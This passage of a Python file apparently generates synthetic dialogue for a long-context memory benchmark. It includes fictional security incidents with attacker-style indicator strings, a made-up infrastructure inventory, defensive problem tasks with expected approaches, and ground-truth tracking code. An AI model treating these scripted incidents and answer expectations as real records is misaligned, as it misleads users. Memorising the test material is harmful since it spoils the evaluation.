            {"turn_pct": 0.3, "new_status": "investigating", "detail": "Root cause analysis in progress; initial entry via phishing email"},
            {"turn_pct": 0.6, "new_status": "remediated", "detail": "All encrypted files restored from backup; attacker C2 blocked at firewall"},
            {"turn_pct": 0.9, "new_status": "closed", "detail": "Post-incident review complete; MFA enforced for all admin accounts"},
        ],
    },
    {
        "id": "INC-2024-002",
        "title": "Data exfiltration via compromised service account",
        "status": "active",
        "severity": "critical",
        "affected_systems": ["DB-PROD-01", "API-GW-01"],
        "iocs": ["172.16.0.100", "data.exfil.evil.com", "svc_backup"],
        "cves": [],
        "timeline": [
            {"time": "2024-03-16 02:00", "action": "Large data transfer detected from DB-PROD-01"},
            {"time": "2024-03-16 02:20", "action": "C2 connection confirmed to 185.220.101.45"},
            {"time": "2024-03-16 03:00", "action": "svc_backup account disabled"},
            {"time": "2024-03-16 04:00", "action": "Forensic imaging of DB-PROD-01 initiated"},
        ],
        "updates": [
            {"turn_pct": 0.4, "new_status": "investigating", "detail": "Confirmed 2.3GB exfiltrated; customer PII may be affected"},
            {"turn_pct": 0.7, "new_status": "contained", "detail": "All service account passwords rotated; egress filtering tightened"},
            {"turn_pct": 0.95, "new_status": "remediated", "detail": "Breach notification sent to 15,000 affected customers"},
        ],
    },
    {
        "id": "INC-2024-003",
        "title": "APT campaign targeting development infrastructure",
        "status": "active",
        "severity": "critical",
        "affected_systems": ["CI-SERVER-01", "GIT-01", "DEV-WORKSTATION-12"],
        "iocs": ["event-stream@5.0.0", "tunnel.attacker.net", "xmrig"],
        "cves": ["CVE-2024-3094"],
        "timeline": [
            {"time": "2024-03-17 16:00", "action": "Supply chain compromise detected in event-stream package"},
            {"time": "2024-03-17 16:30", "action": "CI-SERVER-01 found running crypto miner"},
            {"time": "2024-03-17 17:00", "action": "DNS tunneling from GIT-01 confirmed"},
            {"time": "2024-03-17 18:00", "action": "xz-utils backdoor (CVE-2024-3094) found on DEV-WORKSTATION-12"},
        ],
        "updates": [
            {"turn_pct": 0.5, "new_status": "investigating", "detail": "APT group attribution: likely state-sponsored; TTPs match APT29"},
            {"turn_pct": 0.8, "new_status": "contained", "detail": "All affected systems rebuilt from golden images; package audit complete"},
        ],
    },
    {
        "id": "INC-2024-004",
        "title": "Cloud credential exposure in public repository",
        "status": "active",
        "severity": "high",
        "affected_systems": ["AWS-PROD-ACCOUNT", "S3-CUSTOMER-DATA"],
        "iocs": ["AKIA*", "prod-customer-data"],
        "cves": [],
        "timeline": [
            {"time": "2024-03-17 12:00", "action": "AWS key found in public GitHub repository"},
            {"time": "2024-03-17 12:05", "action": "Key immediately revoked via AWS console"},
            {"time": "2024-03-17 12:15", "action": "CloudTrail audit initiated for key usage"},
        ],
        "updates": [
            {"turn_pct": 0.35, "new_status": "investigating", "detail": "Key was used 3 times from unknown IP before revocation"},
            {"turn_pct": 0.65, "new_status": "contained", "detail": "S3 access logs show no customer data accessed; key only listed buckets"},
            {"turn_pct": 0.85, "new_status": "closed", "detail": "Git-secrets hook deployed to all repos; mandatory pre-commit scanning"},
        ],
    },
    {
        "id": "INC-2024-005",
        "title": "Brute force attack on RDP services",
        "status": "contained",
        "severity": "high",
        "affected_systems": ["JUMP-01", "TERM-SERVER-01"],
        "iocs": ["192.168.2.10", "0.0.0.0/0:3389"],
        "cves": [],
        "timeline": [
            {"time": "2024-03-16 09:00", "action": "Firewall rule change detected: RDP opened to internet"},
            {"time": "2024-03-16 09:05", "action": "150 RDP brute force attempts detected"},
            {"time": "2024-03-16 09:10", "action": "Firewall rule reverted; RDP restricted to VPN only"},
        ],
        "updates": [
            {"turn_pct": 0.45, "new_status": "remediated", "detail": "No successful logins confirmed; network admin retrained on change management"},
            {"turn_pct": 0.75, "new_status": "closed", "detail": "Firewall change automation deployed requiring approval workflow"},
        ],
    },
    {
        "id": "INC-2024-006",
        "title": "Insider threat - bulk document download",
        "status": "active",
        "severity": "high",
        "affected_systems": ["SHAREPOINT-01", "DLP-GATEWAY"],
        "iocs": ["disgruntled_emp", "bulk_download"],
        "cves": [],
        "timeline": [
            {"time": "2024-03-17 14:00", "action": "DLP alert: user downloaded 500+ sensitive documents"},
            {"time": "2024-03-17 14:30", "action": "User account suspended pending investigation"},
            {"time": "2024-03-17 15:00", "action": "HR and Legal notified; device confiscated"},
        ],
        "updates": [
            {"turn_pct": 0.55, "new_status": "investigating", "detail": "User had tendered resignation 2 weeks prior; downloading competitor-sensitive data"},
            {"turn_pct": 0.85, "new_status": "closed", "detail": "Legal action initiated; DLP policies updated to block bulk downloads"},
        ],
    },
    {
        "id": "INC-2024-007",
        "title": "Phishing campaign targeting HR department",
        "status": "active",
        "severity": "medium",
        "affected_systems": ["MAIL-GW-01", "HR-WORKSTATION-03"],
        "iocs": ["support@1egit-company.com", "credential-update.phish.com"],
        "cves": [],
        "timeline": [
            {"time": "2024-03-17 10:00", "action": "Phishing email detected by mail gateway"},
            {"time": "2024-03-17 10:15", "action": "3 users clicked link; 1 entered credentials"},
            {"time": "2024-03-17 10:30", "action": "Affected user password reset; session tokens revoked"},
        ],
        "updates": [
            {"turn_pct": 0.4, "new_status": "contained", "detail": "No lateral movement from compromised account; MFA prevented access"},
            {"turn_pct": 0.7, "new_status": "closed", "detail": "Phishing awareness training scheduled; email domain blocklisted"},
        ],
    },
]

# ============================================================
# Infrastructure inventory (Block 11)
# ============================================================

INFRASTRUCTURE = {
    "subnets": [
        {"name": "prod-web", "cidr": "10.0.1.0/24", "purpose": "Production web servers", "az": "us-east-1a"},
        {"name": "prod-app", "cidr": "10.0.2.0/24", "purpose": "Application tier", "az": "us-east-1b"},
        {"name": "prod-db", "cidr": "10.0.3.0/24", "purpose": "Database tier", "az": "us-east-1c"},
        {"name": "dmz", "cidr": "10.0.4.0/24", "purpose": "DMZ for public-facing services", "az": "us-east-1a"},
        {"name": "mgmt", "cidr": "10.0.5.0/24", "purpose": "Management and monitoring", "az": "us-east-1b"},
        {"name": "dev", "cidr": "10.0.6.0/24", "purpose": "Development environment", "az": "us-east-1c"},
        {"name": "staging", "cidr": "10.0.7.0/24", "purpose": "Staging/pre-production", "az": "us-east-1a"},
        {"name": "vpn", "cidr": "10.0.8.0/24", "purpose": "VPN gateway subnet", "az": "us-east-1b"},
    ],
    "load_balancers": [
        {"name": "alb-prod-web", "type": "ALB", "target": "prod-web", "ports": [80, 443], "ssl_cert": "*.prod.company.com"},
        {"name": "nlb-prod-api", "type": "NLB", "target": "prod-app", "ports": [8443], "ssl_cert": "api.company.com"},
        {"name": "alb-staging", "type": "ALB", "target": "staging", "ports": [80, 443], "ssl_cert": "*.staging.company.com"},
    ],
    "kubernetes_clusters": [
        {"name": "k8s-prod", "version": "1.29", "nodes": 12, "subnet": "prod-app", "namespace_count": 8, "pod_count": 156},
        {"name": "k8s-staging", "version": "1.28", "nodes": 4, "subnet": "staging", "namespace_count": 4, "pod_count": 42},
        {"name": "k8s-dev", "version": "1.29", "nodes": 2, "subnet": "dev", "namespace_count": 12, "pod_count": 28},
    ],
    "firewall_rules": [
        {"name": "allow-web-ingress", "source": "0.0.0.0/0", "dest": "prod-web", "ports": "80,443", "action": "allow"},
        {"name": "allow-api-ingress", "source": "0.0.0.0/0", "dest": "prod-app", "ports": "8443", "action": "allow"},
        {"name": "deny-db-public", "source": "0.0.0.0/0", "dest": "prod-db", "ports": "*", "action": "deny"},
        {"name": "allow-mgmt-ssh", "source": "10.0.8.0/24", "dest": "mgmt", "ports": "22", "action": "allow"},
        {"name": "allow-db-from-app", "source": "10.0.2.0/24", "dest": "prod-db", "ports": "5432,3306", "action": "allow"},
        {"name": "deny-dev-to-prod", "source": "10.0.6.0/24", "dest": "10.0.1.0/24,10.0.2.0/24,10.0.3.0/24", "ports": "*", "action": "deny"},
    ],
    "dns_records": [
        {"name": "api.company.com", "type": "A", "target": "alb-prod-web", "ttl": 300},
        {"name": "app.company.com", "type": "CNAME", "target": "alb-prod-web.us-east-1.elb.amazonaws.com", "ttl": 300},
        {"name": "db-primary.internal", "type": "A", "target": "10.0.3.10", "ttl": 60},
        {"name": "db-replica.internal", "type": "A", "target": "10.0.3.11", "ttl": 60},
        {"name": "monitoring.internal", "type": "A", "target": "10.0.5.20", "ttl": 300},
        {"name": "vpn.company.com", "type": "A", "target": "10.0.8.1", "ttl": 3600},
    ],
    "databases": [
        {"name": "pg-primary", "engine": "PostgreSQL 16", "host": "10.0.3.10", "port": 5432, "size_gb": 450, "replicas": 2},
        {"name": "redis-cache", "engine": "Redis 7.2", "host": "10.0.3.20", "port": 6379, "size_gb": 16, "mode": "cluster"},
        {"name": "es-logs", "engine": "Elasticsearch 8.12", "host": "10.0.5.30", "port": 9200, "size_gb": 2000, "nodes": 5},
        {"name": "mongo-events", "engine": "MongoDB 7.0", "host": "10.0.3.30", "port": 27017, "size_gb": 120, "replicas": 3},
    ],
}

# ============================================================
# Problem-solving tasks (Block 12)
# ============================================================

PROBLEM_TASKS = [
    {
        "task": "Write a bash script to extract all unique source IPs from the auth log that failed login more than 5 times",
        "expected_approach": "awk/grep pipeline with sort | uniq -c | sort -rn, filtering for 'Failed' keyword",
        "context_facts": ["auth log at /var/log/auth.log", "format: timestamp user source_ip action"],
    },
    {
        "task": "Design a Terraform module for the DMZ subnet with WAF",
        "expected_approach": "azurerm_subnet + azurerm_web_application_firewall_policy with OWASP ruleset",
        "context_facts": ["Azure subscription", "DMZ CIDR 10.0.4.0/24", "WAF should use OWASP 3.2 ruleset"],
    },
    {
        "task": "Write a Python script to parse the security events and identify brute force patterns (more than 5 failed logins from same IP within 60 seconds)",
        "expected_approach": "Group events by source_ip, filter by time window using datetime, threshold check",
        "context_facts": ["Events are JSON with timestamp, source_ip, event fields", "Brute force = 5+ failures in 60s"],
    },
    {
        "task": "Create a Kubernetes NetworkPolicy that allows only prod-app pods to access the database on port 5432",
        "expected_approach": "NetworkPolicy with podSelector for app tier, ingress rule for port 5432",
        "context_facts": ["K8s cluster k8s-prod", "DB on port 5432 in prod-db subnet", "App pods labeled app=backend"],
    },
    {
        "task": "Write a SIEM correlation rule to detect the APT kill chain: recon -> exploitation -> lateral movement -> exfiltration",
        "expected_approach": "Multi-stage rule with time window, correlating port_scan + exploit + psexec + large_transfer events",
        "context_facts": ["SIEM uses Sigma rule format", "Time window should be 24 hours", "Minimum confidence threshold 0.8"],
    },
    {
        "task": "Design an incident response playbook for ransomware detection and containment",
        "expected_approach": "5-phase playbook: detect, triage, contain, eradicate, recover with specific actions at each phase",
        "context_facts": ["Reference NIST SP 800-61", "Must include network isolation steps", "Recovery from known-good backups"],
    },
    {
        "task": "Write a SQL query to find all database users with excessive privileges who haven't logged in for 90 days",
        "expected_approach": "JOIN pg_roles with pg_stat_activity, filter by last_login date and role membership",
        "context_facts": ["PostgreSQL 16 database", "Use pg_roles and pg_stat_activity views", "90-day threshold"],
    },
    {
        "task": "Create a CloudWatch alarm and SNS notification for detecting unusual API Gateway error rates",
        "expected_approach": "CloudWatch metric math for 5xx rate, threshold at 5%, SNS topic with email subscription",
        "context_facts": ["AWS CloudWatch", "API Gateway logs to CloudWatch", "Alert when 5xx > 5% of total requests"],
    },
    {
        "task": "Write a Suricata IDS rule to detect DNS tunneling with high entropy domain names",
        "expected_approach": "Suricata rule using dns.query with PCRE for high-entropy base64-like subdomains",
        "context_facts": ["Suricata IDS version 7", "DNS tunneling uses encoded data in subdomains", "Entropy threshold > 3.5 bits/char"],
    },
    {
        "task": "Design a log retention and rotation policy for compliance with SOC2 requirements",
        "expected_approach": "Tiered retention: hot (30d), warm (90d), cold (365d), archive (7yr) with automated lifecycle rules",
        "context_facts": ["SOC2 requires minimum 1 year retention", "Current log volume is 50GB/day", "Must support searchability for 90 days"],
    },
    {
        "task": "Write a Python script to calculate the CVSS v3.1 base score given the attack vector metrics",
        "expected_approach": "Implementation of CVSS formula with ISS, ISC, exploitability sub-scores",
        "context_facts": ["CVSS v3.1 specification", "Input: AV, AC, PR, UI, S, C, I, A metrics", "Output: base score 0.0-10.0"],
    },
    {
        "task": "Create a Prometheus alerting rule for detecting certificate expiry within 7 days",
        "expected_approach": "PromQL using probe_ssl_earliest_cert_expiry from blackbox exporter, alert when < 7d",
        "context_facts": ["Prometheus with blackbox exporter", "Certificates on *.internal.corp", "Alert via AlertManager"],
    },
]


def _scale_range(start: int, end: int, target_turns: int, total_turns: int) -> tuple[int, int]:
    """Scale a block range to fit within a target number of turns."""
    ratio = target_turns / total_turns
    scaled_start = int(start * ratio)
    scaled_end = int(end * ratio)
    return max(0, scaled_start), max(scaled_start + 1, scaled_end)


def generate_dialogue(num_turns: int = 1000, seed: int = 42) -> GroundTruth:
    """Generate deterministic dialogue content for memory evaluation.

    Supports scaling to 5000+ turns with 12 information blocks.
    Logs progress every 500 turns for large dialogue generation.

    Args:
        num_turns: Total number of dialogue turns (default 1000)
        seed: Random seed for reproducibility

    Returns:
        GroundTruth containing all turns, facts, and tracking data
    """
    gen_start = time.time()
    rng = random.Random(seed)
    turns: list[Turn] = []
    facts_by_entity: dict[str, list[dict[str, Any]]] = {}
    current_values: dict[str, Any] = {}
    superseded_values: dict[str, list[dict[str, Any]]] = {}

    # Calculate block boundaries scaled to num_turns
    # For 1000 turns (original 8 blocks):
    #   1-50, 51-150, 151-300, 301-500, 501-700, 701-850, 851-950, 951-1000
    # For 5000 turns (12 blocks, proportional allocation):
    #   Blocks 1-8 get ~70% of turns, blocks 9-12 get ~30%
    # The reference base is 5000 turns for the 12-block layout.
    REFERENCE_BASE = 5000
    blocks_12 = [
        (1, 250, "people"),           # Block 1:  5%
        (251, 750, "projects"),       # Block 2: 10%
        (751, 1250, "technical"),     # Block 3: 10%
        (1251, 2000, "evolving_story"),  # Block 4: 15%
        (2001, 2500, "numerical"),    # Block 5: 10%
        (2501, 2900, "contradictory"),   # Block 6:  8%
        (2901, 3200, "callbacks"),    # Block 7:  6%
        (3201, 3500, "distractors"),  # Block 8:  6%
        (3501, 4000, "security_logs"),   # Block 9: 10%
        (4001, 4400, "incidents"),    # Block 10: 8%
        (4401, 4750, "infrastructure"),  # Block 11: 7%
        (4751, 5000, "problem_solving"), # Block 12: 5%
    ]

    scaled_blocks: list[tuple[int, int, str]] = []
    for start, end, name in blocks_12:
        s, e = _scale_range(start, end, num_turns, REFERENCE_BASE)
        scaled_blocks.append((s, e, name))

    turn_idx = 0

    # Block 1: People (personal details)
    # Ensure ALL people's facts are delivered even with few turns.
    # When turns are scarce, pack multiple people per turn.
    b_start, b_end, _ = scaled_blocks[0]
    people_turns = b_end - b_start
    people_per_turn = max(1, -(-len(PEOPLE) // people_turns))  # Ceiling division

    def _person_content(person: dict[str, Any]) -> tuple[str, list[dict[str, str]]]:
        """Generate content and facts for a single person."""
        parts: list[str] = []
        fact_list: list[dict[str, str]] = []
        pname = person["name"]
        for key, val in person.items():
            if key == "name":
                continue
            content_map = {
                "birthday": f"{pname}'s birthday is {val}.",
                "allergy": (
                    f"{pname} is allergic to {val}."
                    if val != "none"
                    else f"{pname} has no known allergies."
                ),
                "hobby": f"{pname} enjoys {val} in their free time.",
                "role": f"{pname} works as a {val}.",
                "team": f"{pname} is on the {val} team.",
                "pet": (
                    f"{pname} has a {val}." if val != "none" else f"{pname} doesn't have any pets."
                ),
                "hometown": f"{pname} is originally from {val}.",
                "favorite_food": f"{pname}'s favorite food is {val}.",
                "degree": f"{pname} holds a {val}.",
            }
            parts.append(content_map.get(key, f"{pname}'s {key} is {val}."))
            fact_list.append({"entity": pname, "attribute": key, "value": str(val)})
        return " ".join(parts), fact_list

    p_idx = 0
    while p_idx < len(PEOPLE) and turn_idx < b_end:
        # Pack people_per_turn people into this turn
        batch = PEOPLE[p_idx : p_idx + people_per_turn]
        all_parts = []
        all_facts: list[dict[str, str]] = []
        for person in batch:
            content, facts = _person_content(person)
            all_parts.append(content)
            all_facts.extend(facts)
            # Track in ground truth
            pname = person["name"]
            for key, val in person.items():
                if key == "name":
                    continue
                entity_key = f"{pname}.{key}"
                facts_by_entity.setdefault(entity_key, []).append(
                    {"value": str(val), "turn": turn_idx}
                )
                current_values[entity_key] = str(val)

        turns.append(
            Turn(
                turn_number=turn_idx,
                content=" ".join(all_parts),
                block=1,
                block_name="people",
                facts=all_facts,
            )
        )
        turn_idx += 1
        p_idx += people_per_turn

    # Block 2: Projects (with updates)
    b_start, b_end, _ = scaled_blocks[1]
    # First, introduce each project
    for proj in PROJECTS:
        if turn_idx >= b_end:
            break
        content = (
            f"New project update: Project {proj['name']} is a {proj['description']}. "
            f"The deadline is {proj['original_deadline']}, budget is {proj['budget']}, "
            f"team size is {proj['team_size']} people, and the lead is {proj['lead']}."
        )
        facts = [
            {
                "entity": f"Project {proj['name']}",
                "attribute": "description",
                "value": proj["description"],
            },
            {
                "entity": f"Project {proj['name']}",
                "attribute": "deadline",
                "value": proj["original_deadline"],
            },
            {"entity": f"Project {proj['name']}", "attribute": "budget", "value": proj["budget"]},
            {
                "entity": f"Project {proj['name']}",
                "attribute": "team_size",
                "value": str(proj["team_size"]),
            },
            {"entity": f"Project {proj['name']}", "attribute": "lead", "value": proj["lead"]},
        ]
        for f in facts:
            ek = f"{f['entity']}.{f['attribute']}"
            facts_by_entity.setdefault(ek, []).append({"value": f["value"], "turn": turn_idx})
            current_values[ek] = f["value"]

        turns.append(
            Turn(turn_number=turn_idx, content=content, block=2, block_name="projects", facts=facts)
        )
        turn_idx += 1

    # Project updates (spread through the block)
    project_updates = []
    for proj in PROJECTS:
        for upd in proj["updates"]:
            scaled_offset = int(upd["turn_offset"] * (b_end - b_start) / 100) + b_start
            project_updates.append((scaled_offset, proj, upd))
    project_updates.sort(key=lambda x: x[0])

    for target_turn, proj, upd in project_updates:
        if turn_idx >= b_end:
            break
        # Pad with filler turns if needed
        while turn_idx < min(target_turn, b_end):
            content = (
                f"Routine check-in: Project {rng.choice(PROJECTS)['name']} is proceeding normally."
            )
            turns.append(
                Turn(
                    turn_number=turn_idx, content=content, block=2, block_name="projects", facts=[]
                )
            )
            turn_idx += 1

        if turn_idx >= b_end:
            break

        entity = f"Project {proj['name']}"
        attr = upd["change"]
        old_val = str(upd["old"])
        new_val = str(upd["new"])

        content = (
            f"Update on {entity}: the {attr} has been changed from {old_val} to {new_val} "
            f"because {upd['reason']}."
        )
        facts = [{"entity": entity, "attribute": attr, "value": new_val, "supersedes": old_val}]

        ek = f"{entity}.{attr}"
        superseded_values.setdefault(ek, []).append(
            {"old_value": old_val, "new_value": new_val, "turn": turn_idx, "reason": upd["reason"]}
        )
        facts_by_entity.setdefault(ek, []).append({"value": new_val, "turn": turn_idx})
        current_values[ek] = new_val

        turns.append(
            Turn(turn_number=turn_idx, content=content, block=2, block_name="projects", facts=facts)
        )
        turn_idx += 1

    # Fill remaining block 2 turns
    while turn_idx < b_end:
        proj = rng.choice(PROJECTS)
        content = (
            f"Status update: Project {proj['name']} team met for their weekly standup. No changes."
        )
        turns.append(
            Turn(turn_number=turn_idx, content=content, block=2, block_name="projects", facts=[])
        )
        turn_idx += 1

    # Block 3: Technical facts
    b_start, b_end, _ = scaled_blocks[2]
    all_tech_facts = []
    for domain, facts_list in TECHNICAL_DOMAINS.items():
        for fact_text in facts_list:
            all_tech_facts.append((domain, fact_text))
    rng.shuffle(all_tech_facts)

    tech_idx = 0
    while turn_idx < b_end and tech_idx < len(all_tech_facts):
        domain, fact_text = all_tech_facts[tech_idx]
        content = f"Technical note ({domain}): {fact_text}"
        facts = [{"entity": domain, "attribute": "fact", "value": fact_text}]
        ek = f"tech.{domain}.{tech_idx}"
        facts_by_entity.setdefault(ek, []).append({"value": fact_text, "turn": turn_idx})
        current_values[ek] = fact_text

        turns.append(
            Turn(
                turn_number=turn_idx, content=content, block=3, block_name="technical", facts=facts
            )
        )
        turn_idx += 1
        tech_idx += 1

    # Pad remaining block 3
    while turn_idx < b_end:
        domain = rng.choice(list(TECHNICAL_DOMAINS.keys()))
        fact_text = rng.choice(TECHNICAL_DOMAINS[domain])
        content = f"Reminder about {domain}: {fact_text}"
        turns.append(
            Turn(turn_number=turn_idx, content=content, block=3, block_name="technical", facts=[])
        )
        turn_idx += 1

    # Block 4: Evolving storyline with corrections
    b_start, b_end, _ = scaled_blocks[3]
    storyline_entity = "Project Atlas"  # Reuse Atlas for continuity

    evolving_facts = [
        {
            "turn_pct": 0.0,
            "text": f"Breaking: {storyline_entity} hit a major milestone - the core migration engine passed all integration tests.",
            "key": "atlas_milestone",
            "value": "integration tests passed",
        },
        {
            "turn_pct": 0.05,
            "text": f"Correction: earlier report about {storyline_entity} was premature. The integration tests passed but 3 edge cases remain.",
            "key": "atlas_milestone",
            "value": "integration tests passed with 3 remaining edge cases",
            "supersedes": "integration tests passed",
        },
        {
            "turn_pct": 0.1,
            "text": f"{storyline_entity} security review found 5 critical vulnerabilities in the authentication module.",
            "key": "atlas_security",
            "value": "5 critical vulnerabilities found",
        },
        {
            "turn_pct": 0.15,
            "text": f"Update: 3 of the 5 {storyline_entity} security vulnerabilities have been patched. 2 remain.",
            "key": "atlas_security",
            "value": "2 critical vulnerabilities remain",
            "supersedes": "5 critical vulnerabilities found",
        },
        {
            "turn_pct": 0.2,
            "text": f"Good news: all {storyline_entity} security vulnerabilities are now resolved.",
            "key": "atlas_security",
            "value": "all vulnerabilities resolved",
            "supersedes": "2 critical vulnerabilities remain",
        },
        {
            "turn_pct": 0.25,
            "text": f"The {storyline_entity} performance benchmarks show 150ms average response time.",
            "key": "atlas_perf",
            "value": "150ms average response time",
        },
        {
            "turn_pct": 0.3,
            "text": f"After optimization, {storyline_entity} performance improved to 85ms average response time.",
            "key": "atlas_perf",
            "value": "85ms average response time",
            "supersedes": "150ms average response time",
        },
        {
            "turn_pct": 0.35,
            "text": f"{storyline_entity} user acceptance testing started with 50 beta users.",
            "key": "atlas_uat",
            "value": "50 beta users in UAT",
        },
        {
            "turn_pct": 0.4,
            "text": f"The {storyline_entity} beta group expanded to 200 users after positive initial feedback.",
            "key": "atlas_uat",
            "value": "200 beta users in UAT",
            "supersedes": "50 beta users in UAT",
        },
        {
            "turn_pct": 0.45,
            "text": f"Sarah Chen presented the {storyline_entity} progress to the board. The board approved full production rollout.",
            "key": "atlas_status",
            "value": "board approved production rollout",
        },
        {
            "turn_pct": 0.5,
            "text": f"Wait, there's been a complication. A customer data migration bug in {storyline_entity} requires the rollout to be paused.",
            "key": "atlas_status",
            "value": "rollout paused due to data migration bug",
            "supersedes": "board approved production rollout",
        },
        {
            "turn_pct": 0.55,
            "text": f"The {storyline_entity} data migration bug has been fixed. Rollout will resume next week.",
            "key": "atlas_status",
            "value": "bug fixed, rollout resuming next week",
            "supersedes": "rollout paused due to data migration bug",
        },
        {
            "turn_pct": 0.6,
            "text": f"{storyline_entity} is now live in production for 30% of customers.",
            "key": "atlas_status",
            "value": "live for 30% of customers",
            "supersedes": "bug fixed, rollout resuming next week",
        },
        {
            "turn_pct": 0.65,
            "text": f"{storyline_entity} rolled out to 70% of customers. Performance holding steady at 82ms.",
            "key": "atlas_rollout_pct",
            "value": "70%",
        },
        {
            "turn_pct": 0.7,
            "text": f"Full rollout complete: {storyline_entity} is now live for 100% of customers.",
            "key": "atlas_rollout_pct",
            "value": "100%",
            "supersedes": "70%",
        },
        {
            "turn_pct": 0.75,
            "text": f"Post-launch metrics for {storyline_entity}: customer satisfaction up 15%, support tickets down 22%.",
            "key": "atlas_post_launch",
            "value": "satisfaction +15%, tickets -22%",
        },
        {
            "turn_pct": 0.8,
            "text": f"Correction to {storyline_entity} metrics: the actual support ticket reduction is 18%, not 22%.",
            "key": "atlas_post_launch_tickets",
            "value": "support tickets down 18%",
            "supersedes": "tickets -22%",
        },
        {
            "turn_pct": 0.85,
            "text": f"Sarah Chen received the Innovation Award for leading {storyline_entity} to completion.",
            "key": "atlas_award",
            "value": "Sarah Chen received Innovation Award",
        },
        {
            "turn_pct": 0.9,
            "text": f"The {storyline_entity} team is being reorganized. Lars Eriksson will lead the maintenance phase.",
            "key": "atlas_new_lead",
            "value": "Lars Eriksson leads maintenance phase",
        },
        {
            "turn_pct": 0.95,
            "text": f"Final {storyline_entity} cost report: total project cost was $2.7M, under the revised budget of $2.5M... wait, that's OVER budget by $200K.",
            "key": "atlas_final_cost",
            "value": "$2.7M total, $200K over revised budget of $2.5M",
        },
    ]

    block_size = b_end - b_start
    for ef in evolving_facts:
        target = b_start + int(ef["turn_pct"] * block_size)
        while turn_idx < min(target, b_end):
            content = "Day-to-day update: the teams continued their usual work. Nothing unusual to report."
            turns.append(
                Turn(
                    turn_number=turn_idx,
                    content=content,
                    block=4,
                    block_name="evolving_story",
                    facts=[],
                )
            )
            turn_idx += 1

        if turn_idx >= b_end:
            break

        facts = [{"entity": storyline_entity, "attribute": ef["key"], "value": ef["value"]}]
        if "supersedes" in ef:
            facts[0]["supersedes"] = ef["supersedes"]

        ek = f"evolving.{ef['key']}"
        facts_by_entity.setdefault(ek, []).append({"value": ef["value"], "turn": turn_idx})
        current_values[ek] = ef["value"]
        if "supersedes" in ef:
            superseded_values.setdefault(ek, []).append(
                {"old_value": ef["supersedes"], "new_value": ef["value"], "turn": turn_idx}
            )

        turns.append(
            Turn(
                turn_number=turn_idx,
                content=ef["text"],
                block=4,
                block_name="evolving_story",
                facts=facts,
            )
        )
        turn_idx += 1

    while turn_idx < b_end:
        turns.append(
            Turn(
                turn_number=turn_idx,
                content="Quiet day at the office.",
                block=4,
                block_name="evolving_story",
                facts=[],
            )
        )
        turn_idx += 1

    # Block 5: Numerical data
    b_start, b_end, _ = scaled_blocks[4]
    num_idx = 0
    while turn_idx < b_end and num_idx < len(NUMERICAL_DATA):
        nd = NUMERICAL_DATA[num_idx]
        content = (
            f"Data point: The {nd['entity']} is {nd['value']}. Additional context: {nd['detail']}."
        )
        facts = [
            {"entity": nd["entity"], "attribute": "value", "value": nd["value"]},
            {"entity": nd["entity"], "attribute": "detail", "value": nd["detail"]},
        ]

        ek = f"numerical.{nd['entity']}"
        facts_by_entity.setdefault(ek, []).append({"value": nd["value"], "turn": turn_idx})
        current_values[ek] = nd["value"]
        current_values[f"{ek}.detail"] = nd["detail"]

        turns.append(
            Turn(
                turn_number=turn_idx, content=content, block=5, block_name="numerical", facts=facts
            )
        )
        turn_idx += 1
        num_idx += 1

    # Repeat numerical data if more turns needed
    while turn_idx < b_end:
        nd = NUMERICAL_DATA[turn_idx % len(NUMERICAL_DATA)]
        content = f"Reminder: The {nd['entity']} remains at {nd['value']}."
        turns.append(
            Turn(turn_number=turn_idx, content=content, block=5, block_name="numerical", facts=[])
        )
        turn_idx += 1

    # Block 6: Contradictory reports
    b_start, b_end, _ = scaled_blocks[5]
    for cr in CONTRADICTORY_REPORTS:
        for src in cr["sources"]:
            if turn_idx >= b_end:
                break
            content = (
                f"Report from {src['name']}: The {cr['topic']} is {src['claim']}. "
                f"Detail: {src['detail']}."
            )
            facts = [
                {
                    "entity": cr["topic"],
                    "attribute": f"source:{src['name']}",
                    "value": src["claim"],
                    "detail": src["detail"],
                }
            ]

            ek = f"contradiction.{cr['topic']}.{src['name']}"
            facts_by_entity.setdefault(ek, []).append(
                {"value": src["claim"], "turn": turn_idx, "source": src["name"]}
            )
            current_values[ek] = src["claim"]

            turns.append(
                Turn(
                    turn_number=turn_idx,
                    content=content,
                    block=6,
                    block_name="contradictory",
                    facts=facts,
                )
            )
            turn_idx += 1

    while turn_idx < b_end:
        turns.append(
            Turn(
                turn_number=turn_idx,
                content="No new conflicting reports today.",
                block=6,
                block_name="contradictory",
                facts=[],
            )
        )
        turn_idx += 1

    # Block 7: Callback references
    b_start, b_end, _ = scaled_blocks[6]
    # Create callbacks that reference earlier turns
    callback_templates = [
        (
            "Sarah Chen",
            "role",
            "Remember what I told you about the Atlas team? After Sarah Chen received the Innovation Award, Lars Eriksson took over leading the maintenance phase.",
        ),
        (
            "Project Atlas",
            "deadline",
            "Looking back at Project Atlas, the deadline changed multiple times from June 15 to August 3 to September 20.",
        ),
        (
            "Q2 marketing budget",
            "value",
            "Going back to the financial data, the Q2 marketing budget was $2.3M, 15% over the original $2.0M estimate.",
        ),
        (
            "server migration",
            "cost",
            "Recall the server migration costs? The internal audit said $450K, vendor invoice said $387K, and consulting fees were $63K.",
        ),
        (
            "Marcus Rivera",
            "role",
            "By the way, Marcus Rivera who was Product Manager moved to strategic planning. Amara Okafor took over Project Beacon.",
        ),
        (
            "Project Echo",
            "lead",
            "Remember Project Echo? Leadership changed from Fatima Al-Hassan to Yuki Tanaka when Fatima moved to research.",
        ),
        (
            "atlas security",
            "status",
            "Thinking about Atlas security, they went from 5 critical vulns to 3 patched to all resolved.",
        ),
        (
            "test coverage",
            "value",
            "The test coverage metric went from 62.1% at year start to 78.3%. Pretty solid improvement.",
        ),
        ("NPS score", "value", "Our NPS score improved from 65 last quarter to 72 this quarter."),
        (
            "competitor market share",
            "reports",
            "The competitor market share numbers varied wildly: Gartner said 23%, internal said 31%, newsletter said 18%.",
        ),
    ]

    cb_idx = 0
    while turn_idx < b_end and cb_idx < len(callback_templates):
        entity, attr, text = callback_templates[cb_idx]
        content = text
        facts = [{"entity": entity, "attribute": f"callback_{attr}", "value": text}]
        turns.append(
            Turn(
                turn_number=turn_idx, content=content, block=7, block_name="callbacks", facts=facts
            )
        )
        turn_idx += 1
        cb_idx += 1

    while turn_idx < b_end:
        cb = callback_templates[turn_idx % len(callback_templates)]
        turns.append(
            Turn(
                turn_number=turn_idx,
                content=f"Recap: {cb[2]}",
                block=7,
                block_name="callbacks",
                facts=[],
            )
        )
        turn_idx += 1

    # Block 8: Distractors
    b_start, b_end, _ = scaled_blocks[7]
    dist_idx = 0
    while turn_idx < b_end:
